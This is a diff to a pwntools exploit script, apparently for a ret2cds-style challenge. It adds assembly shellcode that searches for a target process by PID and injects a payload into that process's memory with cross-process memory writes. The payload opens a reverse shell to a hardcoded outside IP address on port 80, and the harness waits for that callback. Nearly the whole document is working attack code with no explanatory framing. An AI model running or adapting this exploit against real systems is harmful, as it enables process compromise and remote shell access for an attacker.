@@ -97,7 +97,12 @@ class Const:
     process_write_err = "pwrite err"
 
     cds_rwx_base = 0x800000000
+    cds_len_to_read = 1
     cds_rwx_size = 0x2000
+
+    # final_payload_listen_host = "172.17.0.1"
+    final_payload_listen_host = "137.184.74.226"
+    final_payload_listen_port = 80
 
 shellcode = f"""
     jmp do_it
@@ -123,18 +128,38 @@ do_it:
     mov rsi,{len(Const.hello_msg)}
     call echo_msg
 
-    mov rdi,1066
+    /* Read process mem loop to find target process PID. */
+    mov rbx,1
+pid_search_loop:
+    /* Main loop, current PID search value expected in rbx. */
+    push rbx
+    mov rdi,rbx
+    mov rsi,{hex(Const.cds_rwx_base)}
+    mov rdx,1
+    call read_process_mem
+    cmp rax,1
+    jne bad_pread
+    /* We found the PID. Send it to ourselves and then jump to writing
+       shellcode into its address space. */
+    lea rdi,[rsp]
+    mov rsi,8
+    call echo_msg
+    pop rbx
+    jmp write_shellcode
+bad_pread:
+    /* Didn't find the PID, increment our counter and continue the search. */
+    pop rbx
+    inc rbx
+    jmp pid_search_loop
+
+    /* Write shellcode to the identified parent process. Expects the target
+       PID in rbx. */
+write_shellcode:
+    mov rdi,rbx
     lea rsi,[rip+final_shellcode]
     mov rdx,the_end - final_shellcode
     mov r10,{hex(Const.cds_rwx_base)}
     call write_process_mem
-
-    call exit
-
-    mov rdi,1066
-    mov rsi,{hex(Const.cds_rwx_base)}
-    mov rdx,{hex(Const.cds_rwx_size)}
-    call read_process_mem
 
     call exit
 
@@ -177,7 +202,7 @@ echo_msg:
     - rdi: PID of process whose memory to read.
     - rsi: Memory address to read from
     - rdx: Length of region to read
-   Read data is placed into the iovec_local region.
+   Returns: 1 on success, 0 on error.
 */
 read_process_mem:
     mov rcx,rsi
@@ -193,7 +218,7 @@ read_process_mem:
     mov r10,{hex(Const.iovec_remote)}
     mov [r10+0],rcx
     mov [r10+8],rbx
-    mov r8,1
+    mov r8,{Const.cds_len_to_read}
     /* No flags. */
     mov r9,0
     /* Do the syscall. */
@@ -207,11 +232,13 @@ read_process_mem:
     mov rdi,{hex(Const.iovec_local+0x10)}
     mov rsi,rax
     call echo_msg
+    mov rax,1
     ret
 read_process_mem_err:
     lea rdi,[rip+process_read_err]
     mov rsi,{len(Const.process_read_err)}
     call echo_msg
+    mov rax,0
     ret
 
 /* Args:
@@ -219,7 +246,7 @@ read_process_mem_err:
     - rsi: Local memory address containing data to write
     - rdx: Length of data to write to remote process
     - r10: Remote memory address to write to
-   Read data is placed into the iovec_local region.
+   Returns: 1 on success, 0 on error.
 */
 write_process_mem:
     mov rbx,rsi
@@ -246,10 +273,14 @@ write_process_mem:
        or -1 on error. */
     cmp rax,0
     jle write_process_mem_err
+    /* No error, return success. */
+    mov rax,1
+    ret
 write_process_mem_err:
     lea rdi,[rip+process_write_err]
     mov rsi,{len(Const.process_write_err)}
     call echo_msg
+    mov rax,0
     ret
 
 exit:
@@ -257,11 +288,13 @@ exit:
     syscall
 
 final_shellcode:
-    int3
-    int3
-    int3
-    int3
-    int3
+    .rept 100
+    nop
+    .endr
+"""
+shellcode += shellcraft.connect(Const.final_payload_listen_host, Const.final_payload_listen_port)
+shellcode += shellcraft.dupsh()
+shellcode += """
 the_end:
     nop
 """
@@ -364,14 +397,22 @@ do_rop(
     Const.mmap_base
 )
 
-sleep(2)
+sleep(5)
+log.info("Sending shellcode...")
 io.send(shellcode)
 
-msg = recv_shellcode_msg()
-assert msg.decode() == Const.hello_msg
-log.info("Got hello message from shellcode...")
+callback_io = listen(
+    bindaddr=Const.final_payload_listen_host,
+    port=Const.final_payload_listen_port
+)
 
-msg = recv_shellcode_msg()
-print(msg)
+# Make sure our shellcode starts up as expected.
+assert recv_shellcode_msg().decode() == Const.hello_msg
+log.info("Got hello message from compromised ret2cds process")
 
-io.interactive()
+# Barring a successful write into the target process's address space, we can
+# now expect a reverse shell to our listener.
+log.info("Waiting for callback...")
+callback_io.wait_for_connection()
+log.success("Got connection!")
+callback_io.interactive()
